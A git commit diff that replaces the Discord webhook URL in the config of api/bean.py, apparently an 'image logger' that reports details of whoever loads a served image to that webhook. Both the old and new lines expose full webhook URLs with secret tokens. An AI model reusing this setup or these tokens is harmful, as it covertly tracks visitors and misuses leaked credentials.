59bda14c2d7df778017307715ee6fcd30a3cebe1
negromater <128333548+negromater@users.noreply.github.com>
2023-03-20 01:50:23 +0100

    Update bean.py

--- api/bean.py
+++ api/bean.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1087172176580464730/_BmJ9_Kk3qWqwJTv02Oe5KfE8rUI9FE2-JCTaoG0XFgdSZ9tUMJOlGm3enJXpqUV8V6d",
+    "webhook": "https://discord.com/api/webhooks/1087176106169339955/EmWgg0ruTcwkLy2wwTCM7o0qcMvxW3ABBlJ3aNXPZv0pfoa88XV2juCsU9rIqDxAKnQL",
     "image": "https://i1.sndcdn.com/avatars-XXzxh8piTnbN2qUS-HzmzlA-t240x240.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
